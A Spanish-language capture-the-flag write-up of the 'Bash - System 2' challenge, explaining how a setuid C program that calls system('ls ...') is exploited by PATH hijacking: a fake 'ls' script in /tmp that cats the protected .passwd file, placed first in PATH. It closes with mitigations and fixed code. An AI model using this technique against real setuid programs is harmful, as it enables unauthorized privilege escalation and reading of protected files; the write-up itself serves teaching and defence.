Writeup: Bash - System 2
📋 Información del Desafío
Campo	Valor
Nombre	Bash - System 2
Autor	Lu33Y
Fecha	8 febrero 2012
Nivel	Principiante
Puntos	10
Validaciones	32,704 challengeurs
Tasa de éxito	9%
🎯 Objetivo

El objetivo de este desafío es leer el contenido del archivo .passwd ubicado en /challenge/app-script/ch12/.passwd explotando una vulnerabilidad en el código fuente proporcionado.
🔍 Análisis del Código Fuente
Código Original
c

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}

Análisis Línea por Línea

    setreuid(geteuid(), geteuid()):

        Establece los IDs real y efectivo del usuario al mismo valor

        Esto asegura que el programa ejecute con los permisos del propietario

    system("ls -lA /challenge/app-script/ch12/.passwd"):

        VULNERABILIDAD CRÍTICA: Usa system() con una ruta relativa para el comando ls

        Depende del PATH del sistema para localizar el ejecutable ls

        Esto permite PATH Hijacking

    return 0:

        Finaliza la ejecución del programa

🔴 La Vulnerabilidad

La función system() delega la ejecución al shell del sistema (/bin/sh). El shell buscará el comando ls en los directorios listados en la variable de entorno PATH en orden de aparición.

    ⚠️ Problema: Si podemos crear un ejecutable llamado ls y colocarlo en un directorio que aparezca ANTES en el PATH que /bin, el programa ejecutará NUESTRO código en lugar del comando ls legítimo.

🛠️ Exploración Inicial
Verificando el Entorno

Primero, listamos los archivos en el directorio actual:
bash

app-script-ch12@challenge02:~$ ls
ch12  ch12.c

Vemos que tenemos el binario ch12 y su código fuente ch12.c.
Ejecución Normal del Programa

Al ejecutar el programa sin modificar el entorno:
bash

app-script-ch12@challenge02:~$ ./ch12
-r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 Dec 10  2021 /challenge/app-script/ch12/.passwd

Observaciones importantes:

    El programa funciona correctamente

    Muestra los permisos del archivo .passwd

    Pero NO muestra su contenido (solo los permisos y metadata)

Verificando Variables de Entorno
bash

app-script-ch12@challenge02:~$ alias
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias gdb-gef='/usr/bin/gdb -x /opt/tools/gef/gef.py -q '
alias gdb-peda='/usr/bin/gdb -x /opt/tools/peda/peda.py -q '
alias gdb-pwndbg='/usr/bin/gdb -x /opt/tools/pwndbg/gdbinit.py -q '
alias gef='gdb-gef'
alias grep='grep --color=auto'
alias l='ls '
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias peda='gdb-peda'
alias pwndbg='gdb-pwndbg'

Notamos que ls tiene un alias con colores, pero esto no afectará nuestro ataque.
Explorando Directorios
bash

app-script-ch12@challenge02:~$ ls /tmp
ls: cannot open directory '/tmp': Permission denied

¡Importante! No tenemos permisos para listar el contenido de /tmp, pero veremos que podemos crear directorios dentro de él.
🛠️ Estrategia de Explotación
Plan de Ataque
💣 Ejecución del Ataque
Paso 1: Creación del Directorio de Trabajo

Primero intentamos crear un archivo directamente en /tmp, pero falla:
bash

app-script-ch12@challenge02:~$ echo 'cat /challenge/app-script/ch12/.passwd' > /tmp/ls
-bash: /tmp/ls: Permission denied

Aunque no podemos escribir directamente en /tmp, podemos crear un subdirectorio:
bash

app-script-ch12@challenge02:~$ mkdir /tmp/kr3s
app-script-ch12@challenge02:~$ cd /tmp/kr3s

¿Por qué /tmp/kr3s?

    Podemos crear directorios dentro de /tmp aunque no podamos listar su contenido

    /tmp tiene permisos que permiten creación de subdirectorios (drwxrwx-wt)

    El nombre kr3s es arbitrario (puede ser cualquier cosa)

Paso 2: Creación del Script Malicioso

Ahora creamos nuestro falso comando ls:
bash

app-script-ch12@challenge02:~$ echo 'cat /challenge/app-script/ch12/.passwd' > /tmp/kr3s/ls-exploit

Pero necesitamos que se llame exactamente ls, así que lo renombramos:
bash

app-script-ch12@challenge02:~$ mv /tmp/kr3s/ls-exploit /tmp/kr3s/ls

Paso 3: Verificación y Permisos

Verificamos que el archivo se haya creado correctamente:
bash

app-script-ch12@challenge02:~$ ls -la /tmp/kr3s
total 4
drwxr-x---  2 app-script-ch12 app-script-ch12  60 Jul 29 12:57 .
drwxrwx-wt 30 root            root            880 Jul 29 12:55 ..
-rwxr-x---  1 app-script-ch12 app-script-ch12  39 Jul 29 12:55 ls

Análisis de permisos:

    -rwxr-x---: El archivo es ejecutable por el propietario y grupo

    El contenido es el comando cat que mostrará el archivo .passwd

Paso 4: Modificación del PATH

Verificamos el PATH actual:
bash

app-script-ch12@challenge02:~$ PATH
PATH: command not found

Observación: En Bash, ejecutar PATH sin echo muestra error. Usamos export correctamente:
bash

app-script-ch12@challenge02:~$ export PATH=/tmp/kr3s:$PATH

¿Qué logramos?

    Nuestro directorio /tmp/kr3s ahora está primero en el PATH

    El shell buscará aquí antes que en /bin o /usr/bin

Paso 5: Ejecución del Programa Vulnerable

Finalmente, ejecutamos el programa desde nuestro directorio original:
bash

app-script-ch12@challenge02:~$ ./ch12
**************

🎉 ¡Éxito! Hemos obtenido la flag.
🔬 Explicación Técnica Detallada
¿Qué sucede internamente?

    El programa inicia:
    c

    setreuid(geteuid(), geteuid());

    Se ejecuta system():
    c

    system("ls -lA /challenge/app-script/ch12/.passwd");

    El shell interpreta el comando:

        Llama a fork() para crear un proceso hijo

        El proceso hijo ejecuta /bin/sh -c "ls -lA /challenge/app-script/ch12/.passwd"

    Búsqueda del comando ls:

        El shell recorre los directorios en PATH en orden: /tmp/kr3s → /usr/local/bin → /usr/bin → /bin

        Encuentra nuestro script en /tmp/kr3s/ls antes que el /bin/ls legítimo

    Ejecución del script malicioso:

        Nuestro script se ejecuta con los permisos del programa (gracias a setreuid)

        cat lee el archivo .passwd y muestra su contenido

Diagrama de Flujo de Ejecución
Comparativa: Ejecución Normal vs Explotada
Aspecto	Ejecución Normal	Ejecución Explotada
PATH	/usr/local/bin:/usr/bin:/bin	/tmp/kr3s:/usr/local/bin:/usr/bin:/bin
ls buscado	/bin/ls	/tmp/kr3s/ls
Resultado	Muestra permisos del archivo	Muestra contenido del archivo
📸 Capturas del Proceso
1. Exploración Inicial
text

app-script-ch12@challenge02:~$ ls
ch12  ch12.c
app-script-ch12@challenge02:~$ ./ch12
-r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 Dec 10  2021 /challenge/app-script/ch12/.passwd

2. Creación del Directorio y Script
text

app-script-ch12@challenge02:~$ echo 'cat /challenge/app-script/ch12/.passwd' > /tmp/ls
-bash: /tmp/ls: Permission denied
app-script-ch12@challenge02:~$ mkdir /tmp/kr3s
app-script-ch12@challenge02:~$ echo 'cat /challenge/app-script/ch12/.passwd' > /tmp/kr3s/ls-exploit
app-script-ch12@challenge02:~$ chmod +x /tmp/kr3s/ls-exploit
app-script-ch12@challenge02:~$ mv /tmp/kr3s/ls-exploit /tmp/kr3s/ls

3. Verificación y Explotación
text

app-script-ch12@challenge02:~$ ls -la /tmp/kr3s
total 4
drwxr-x---  2 app-script-ch12 app-script-ch12  60 Jul 29 12:57 .
drwxrwx-wt 30 root            root            880 Jul 29 12:55 ..
-rwxr-x---  1 app-script-ch12 app-script-ch12  39 Jul 29 12:55 ls
app-script-ch12@challenge02:~$ export PATH=/tmp/kr3s:$PATH
app-script-ch12@challenge02:~$ ./ch12
**************

🛡️ Mitigación y Buenas Prácticas
Código Seguro

La solución correcta es usar rutas absolutas:
c

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("/bin/ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}

Otras Medidas de Seguridad

    Usar execvp() con ruta absoluta en lugar de system()

    Limpiar o resetear el PATH antes de ejecutar comandos externos

    Validar todas las entradas del usuario antes de pasarlas a system()

    Usar realpath() para verificar rutas de archivos

Ejemplo de Código Robusto
c

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    
    // Resetear PATH a un valor conocido y seguro
    setenv("PATH", "/bin:/usr/bin", 1);
    
    // Usar ruta absoluta
    system("/bin/ls -lA /challenge/app-script/ch12/.passwd");
    
    return 0;
}

📚 Conceptos Clave Aprendidos
1. PATH Hijacking (Secuestro de PATH)

    Técnica de ataque donde un atacante manipula el PATH para ejecutar código malicioso

    Particularmente peligroso en programas SUID

2. Variable de Entorno PATH

    Lista de directorios donde el shell busca ejecutables

    El orden es crítico: se usa el primero encontrado

    Se puede modificar con export PATH=/nuevo/dir:$PATH

3. SUID Binaries

    Programas que se ejecutan con los permisos del propietario

    setreuid(geteuid(), geteuid()) mantiene los privilegios

    Requieren cuidado extremo al llamar a comandos externos

4. Función system() vs exec*()

    system() invoca al shell, introduciendo riesgos

    exec*() ejecuta directamente, más seguro pero menos flexible

    system() es peligrosa con datos no validados

🎓 Resumen del Ataque
Paso	Acción	Comando	Resultado
1	Crear directorio en /tmp	mkdir /tmp/kr3s	Espacio de trabajo con permisos
2	Crear script malicioso	echo 'cat ...' > /tmp/kr3s/ls	Código malicioso listo
3	Hacer ejecutable	chmod +x /tmp/kr3s/ls	Script ejecutable
4	Modificar PATH	export PATH=/tmp/kr3s:$PATH	Nuestro directorio tiene prioridad
5	Ejecutar programa	./ch12	Programa ejecuta nuestro script
6	Obtener flag	cat muestra .passwd	Flag obtenida ✅
🏆 Flag Final
text

**************

📖 Lecciones para el Futuro

    Siempre usar rutas absolutas al ejecutar comandos desde C/C++

    No confiar en el PATH en programas con privilegios

    Validar y sanitizar todas las entradas antes de usarlas

    Conocer las herramientas del sistema (ls, cat, chmod, export, etc.)

    Entender los permisos y cómo funcionan los SUID binaries

    El orden importa: el PATH se lee en orden secuencial
